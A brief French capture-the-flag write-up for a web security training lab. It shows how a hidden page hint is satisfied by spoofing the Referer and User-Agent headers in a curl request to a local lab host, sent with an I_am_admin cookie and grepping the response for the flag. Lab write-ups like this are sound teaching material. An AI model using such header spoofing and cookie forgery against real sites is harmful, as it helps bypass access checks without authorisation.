EXPLAIN:

Sur le lien en bas du footer

On voit dans le commentaire :

You must cumming from : "https://www.nsa.gov/" to go to the next step
Let's use this browser : "ft_bornToSec". It will help you a lot.

Panneau inspection > Réseau > index.php? …. 

clic droit> copier > copier au format curl 

On change Referrer et User-Agent

curl '[http://192.168.1.17/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c](http://192.168.1.17/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c)' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
-H 'Accept-Language: fr-FR,fr;q=0.9' \
-H 'Connection: keep-alive' \
-H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' \
-H 'DNT: 1' \
-H 'Referer: [https://www.nsa.gov/](https://www.nsa.gov/)' \
-H 'Upgrade-Insecure-Requests: 1' \
-H 'User-Agent: ft_bornToSec' \
--compressed \
--insecure | grep flag

